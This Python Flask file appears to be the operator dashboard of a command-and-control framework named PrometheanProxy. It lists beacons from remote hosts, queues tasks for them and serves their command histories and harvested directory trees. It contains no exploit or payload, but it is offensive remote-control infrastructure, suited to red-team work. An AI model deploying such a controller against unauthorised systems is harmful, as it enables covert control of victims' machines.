import os
import json
from flask import (Flask,
                   render_template,
                   jsonify,
                   request,
                   redirect,
                   make_response)
from flask_socketio import SocketIO, join_room
from Modules.global_objects import (
    beacon_list,
    command_list,
    logger)
from Modules.beacon import add_beacon_command_list, remove_beacon_list


app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")


@socketio.on('join')
def handle_join(data):
    logger.info(f"Client joining room with data: {data}")
    uuid = data
    join_room(uuid)
    logger.info(f"Client joined room: {uuid}")
    logger.info(f"Client joined room: {uuid}")


@app.route('/api/v1/beacons', methods=['GET', 'POST'])
def api_beacons():
    logger.info(f"Received {request.method} request from {request.remote_addr}")
    if request.remote_addr != '127.0.0.1':
        logger.warning("Access denied from non-local address.")
        return jsonify({"error": "Access denied"}), 403

    # POST /api/v1/beacons?command=<uuid>
    if request.method == 'POST' and request.args.get('command'):
        uuid = request.args['command']
        logger.info(f"Command API called for beacon {uuid}")
        data = request.get_json(silent=True) or {}
        cmd_id = data.get('command_id')
        task  = data.get('task')
        payload = data.get('data')
        if not (cmd_id and task):
            logger.error("Missing command_id or task in POST data.")
            return jsonify({"error": "Missing command_id or task"}), 400

        add_beacon_command_list(uuid, cmd_id, task, payload)
        logger.info(f"Added command {cmd_id} ({task}) to beacon {uuid}")
        socketio.emit('command_response', {
            'uuid': uuid,
            'command_id': cmd_id,
            'command': task,
            'response': payload
        }, room=uuid)
        return jsonify({"status": "Command added"}), 200

    # GET /api/v1/beacons?... 
    if request.method == 'GET':
        # 1) Directory traversal tree
        if request.args.get('dirTraversal'):
            uuid = request.args['dirTraversal']
            beacon = beacon_list.get(uuid)
            if not beacon:
                logger.error(f"dirTraversal: unknown UUID {uuid}")
                return jsonify({"error": "Beacon not found"}), 404

            tree_file = os.path.expanduser(
                f"~/.PrometheanProxy/{uuid}/directory_traversal.json"
            )
            if not os.path.isfile(tree_file):
                logger.error(f"dirTraversal file missing for UUID {uuid}")
                return jsonify({"error": "Directory traversal not found"}), 404

            try:
                with open(tree_file, 'r') as f:
                    tree = json.load(f)
                return jsonify(tree), 200
            except Exception as e:
                logger.error(f"Error reading dirTraversal JSON: {e}")
                return jsonify({"error": str(e)}), 500

        # 2) History of non-directory_traversal commands
        if request.args.get('history'):
            uuid = request.args['history']
            history_data = []
            for cmd in command_list.values():
                if cmd.beacon_uuid != uuid or cmd.command == "directory_traversal":
                    continue
                history_data.append({
                    "command_id": cmd.command_uuid,
                    "command": cmd.command,
                    "response": cmd.command_output
                })
            logger.info(f"Returning history for beacon {uuid}")
            return jsonify({"history": history_data}), 200

        # 3) List all beacons
        beacons_grouped = {}
        for b_id, beacon in beacon_list.items():
            beacons_grouped[b_id] = {
                "address":         beacon.address,
                "hostname":        beacon.hostname,
                "operating_system": beacon.operating_system,
                "last_beacon":     beacon.last_beacon,
                "next_beacon":     beacon.next_beacon,
                "timer":           beacon.timer,
                "jitter":          beacon.jitter
            }
        logger.info("Returning all beacons")
        return jsonify({"beacons": beacons_grouped}), 200

    # Fallback for other methods
    return jsonify({"error": "Method not allowed"}), 405

@app.route('/api/v1/beacons/<uuid>')
def api_beacon(uuid):
    if request.remote_addr != '127.0.0.1':
        return jsonify({"error": "Access denied"}), 403

    # Find the beacon with the given UUID
    beacon_data = None
    for beaconID, beacon in beacon_list.items():
        if beaconID == uuid:
            beacon_data = {
                "address": beacon.address,
                "hostname": beacon.hostname,
                "operating_system": beacon.operating_system,
                "last_beacon": beacon.last_beacon,
                "next_beacon": beacon.next_beacon,
                "timer": beacon.timer,
                "jitter": beacon.jitter
            }
            break
    if beacon_data:
        logger.info(f"Beacon data retrieved for UUID: {uuid}")
        return jsonify({"beacon": beacon_data})
    else:
        logger.error(f"Beacon not found for UUID: {uuid}")
        return jsonify({"error": "Beacon not found"}), 404


@app.route('/beacons')
def beacon():
    logger.info("Beacon page accessed")
    if request.args.get('uuid'):
        uuid = request.args.get('uuid')
        beacon_data = None
        for beaconID, beacon in beacon_list.items():
            if beaconID == uuid:
                beacon_data = {
                    "address": beacon.address,
                    "hostname": beacon.hostname,
                    "operating_system": beacon.operating_system,
                    "last_beacon": beacon.last_beacon,
                    "next_beacon": beacon.next_beacon,
                    "timer": beacon.timer,
                    "jitter": beacon.jitter
                }
                logger.info(f"Beacon data found for UUID: {uuid}")
                break
        if beacon_data:
            return render_template('beacon.html', beacon=beacon_data,
                                   uuid=uuid)
        else:
            logger.error(f"Beacon not found for UUID: {uuid}")
            return redirect('/')
    else:
        logger.error("UUID not provided in request")
        return redirect('/')


@app.route('/')
def index():
    logger.info("Index page accessed")
    response = make_response(render_template('index.html',
                                             beacons=beacon_list,
                                             commands=command_list))
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0' # noqa
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '-1'
    return response


@app.route('/favicon.ico')
def favicon():
    return "", 204
